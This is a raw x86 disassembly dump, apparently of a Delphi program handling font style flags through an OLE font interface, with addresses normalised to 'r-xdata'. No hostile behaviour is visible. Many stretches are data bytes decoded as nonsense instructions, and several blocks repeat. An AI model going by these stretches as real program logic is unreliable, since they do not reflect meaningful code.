call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42a608
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42a63c
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403254
retn
mov eax [ ebx + 0x1c ]
call sub_4237d0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_47c448
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b4d0
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_426728
call sub_42a88c
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_426740
call sub_4273ac
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427120
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47be05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d7c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d94
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426dec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47bdd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_423f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bde0
mov eax [ ebp - 0x18 ]
call sub_403254
retn
mov eax [ ebp - 0x8 ]
call sub_405a08
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_47c464
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_47b4d0
sub_47adec
cmp [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
scasb [ edi ]
add [ eax ] al
add [ eax ] al
mov eax eax
and al 0xaf
inc edi
je r-xdata
cmp [ edi - 0x50beffb9 ] ebp
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
add al 0x24
retn
popad
jo r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp sub_405adc
outsd
je r-xdata
add [ esi + 0x47ae ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] ah
inc edi
add [ eax + eax ] dl
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add [ ebx - 0x62ffb850 ] dl
mov al 0x47
add [ edi - 0x78ffb850 ] ah
mov al 0x47
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
jb r-xdata
inc edi
add [ ebx - 0x51 ] dh
inc edi
add [ ebp - 0x51 ] bh
inc edi
add [ edi + 0x670047af ] al
scasd [ edi ]
inc edi
add [ edx ] al
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x200047af ] 0x0
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
add [ ebp - 0x51 ] bl
inc edi
add [ ecx ] bh
scasd [ edi ]
inc edi
add [ ecx - 0x51 ] al
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x52 ] bl
inc edi
add [ eax + eax ] bl
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ eax - 0x3bffb84c ] bl
mov ah 0x47
add [ edx + ebp + 0x40 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] dh
add [ eax ] al
mov ah 0x11
inc eax
add [ eax + eax ] dl
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add [ eax - 0x52 ] al
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
jae r-xdata
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0xb0b4da82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0xb0c8da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov cl 0x47
add al bl
mov al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] ch
inc edi
add [ eax ] ch
add [ eax ] al
add ah ch
cmp eax 0xafa7da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc eax
mov al 0x47
add [ edi + 0x47af ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] cl
inc edi
add [ eax ] ch
add [ eax ] al
add ah ch
lodsd [ esi ]
inc edi
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cwde
mov ah 0x47
add [ eax ] bl
mov eax 0xb6500047
inc edi
add [ esp + edx * 2 ] cl
inc esi
outsd
outsb
je r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bae9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_47b5eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc esp
and al 0x4
loopne r-xdata
inc edi
add [ ebp - 0x50 ] bh
inc edi
add [ ecx - 0x50 ] bl
inc edi
add [ ecx - 0x50 ] ah
inc edi
inc edi
add ah dl
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47baf0
lea eax [ ebp - 0x2c ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4236b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047fc
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_40480c
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_42372c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
int3
inc ecx
stosb [ edi ]
clc
inc [ ebx - 0x1ffbdbbc ]
jmp sub_405adc
lodsd [ esi ]
inc edi
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cwde
mov ah 0x47
add ah al
mov ah 0x47
add ah al
mov ebx 0x540f0047
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
rol [ edi ] 0xf4
rol [ edi ] 0xd0
pop ebp
inc edx
add [ eax ] bh
rol [ edi ] 0x80
rol [ edi ] 0x38
pop esi
inc edx
add [ eax + 0x480047c1 ] ah
pop esi
inc edx
add [ eax ] dl
pop ebx
inc edx
add al ch
rol [ edi ] 0xdc
pop ebp
inc edx
add ah ch
rol [ edi ] 0x3c
retn 0x47
mov cl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x47
add [ edx + esi * 4 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov dl 0x47
add [ eax + eax ] ch
add [ eax ] al
pop esp
and [ edx ] al
pushfd
xor al 0x40
add [ ebp + ebp * 4 + 0x41 ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 + 0x5bb80041 ] ch
inc edx
add [ eax - 0x3ffb842 ] bl
lodsd [ esi ]
inc ecx
add ah cl
mov esi 0xbed00047
inc edi
add [ esp + ebx * 2 ] al
inc edx
add ah bl
mov edi 0xc0500047
inc edi
add [ eax - 0x2bffb840 ] bh
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_47bcf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42a608
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42a63c
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403254
retn
mov eax [ ebx + 0x1c ]
call sub_4237d0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_47c448
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b4d0
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_426728
call sub_42a88c
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_426740
call sub_4273ac
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427120
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47be05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d7c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d94
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426dec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47bdd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_423f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bde0
mov eax [ ebp - 0x18 ]
call sub_403254
retn
mov eax [ ebp - 0x8 ]
call sub_405a08
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_47c464
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_47b4d0
sub_47b0b4
imul esi [ eax - 0x4f8cffb9 ] 0xb07d0047
jae r-xdata
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0xb0b4da82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0xb0c8da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov cl 0x47
add al bl
mov al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] ch
inc edi
add [ eax ] ch
add [ eax ] al
add ah ch
inc esp
and al 0x4
loopne r-xdata
inc edi
add [ ecx - 0x50 ] bl
inc edi
add [ ecx - 0x50 ] ah
inc edi
add [ ebx - 0x62ffb850 ] dl
mov al 0x47
add [ edi - 0x78ffb850 ] ah
mov al 0x47
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
inc edi
add [ ebp - 0x50 ] bh
inc edi
add ah dl
jb r-xdata
int3
inc ecx
stosb [ edi ]
clc
inc [ ebx - 0x1ffbdbbc ]
jmp sub_405adc
lodsd [ esi ]
inc edi
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cwde
mov ah 0x47
add ah al
mov ah 0x47
add ah al
mov ebx 0x540f0047
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
rol [ edi ] 0xf4
rol [ edi ] 0xd0
pop ebp
inc edx
add [ eax ] bh
rol [ edi ] 0x80
rol [ edi ] 0x38
pop esi
inc edx
add [ eax + 0x480047c1 ] ah
pop esi
inc edx
add [ eax ] dl
pop ebx
inc edx
add al ch
rol [ edi ] 0xdc
pop ebp
inc edx
add ah ch
rol [ edi ] 0x3c
retn 0x47
mov cl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x47
add [ edx + esi * 4 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov dl 0x47
add [ eax + eax ] ch
add [ eax ] al
pop esp
and [ edx ] al
pushfd
xor al 0x40
add [ ebp + ebp * 4 + 0x41 ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 + 0x5bb80041 ] ch
inc edx
add [ eax - 0x3ffb842 ] bl
lodsd [ esi ]
inc ecx
add ah cl
mov esi 0xbed00047
inc edi
add [ esp + ebx * 2 ] al
inc edx
add ah bl
mov edi 0xc0500047
inc edi
add [ eax - 0x2bffb840 ] bh
sub_47b270
push ebx
call sub_402854
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_47b29c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_405a4c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b614
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_405a20
sub edx 0xffffffdc
sub_47b2ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a4c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47bb88
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405a20
sub edx 0xffffffdc
sub_47b33c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b37f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47b29c
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b386
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47b38c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a7c
xor eax eax
push ebp
push sub_47b3e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b29c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b3ed
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47b3f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b437
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47b2ec
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b43e
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47b444
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b584
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403578
lea eax [ esi + 0x14 ]
call sub_405a20
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47b498
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_47b554
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_47b4d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a7c
xor eax eax
push ebp
push sub_47b538
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_47b554
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b53f
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4796c4
sub_47b584
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47b614
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_47b444
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47b650
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b7f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b7fb
lea eax [ ebp - 0x28 ]
call sub_403fa4
lea eax [ ebp - 0x24 ]
call sub_405a08
lea eax [ ebp - 0xc ]
call sub_4046b0
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4046b0
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_47b7c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_4236d0
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_402a24
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_423748
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423774
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_4237d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403254
retn
or bl 0x8
sub_47b818
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b996
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_403fa4
lea eax [ ebp - 0xc ]
call sub_4046b0
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_47b969
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4236b8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4047fc
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42372c
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423768
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423768
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
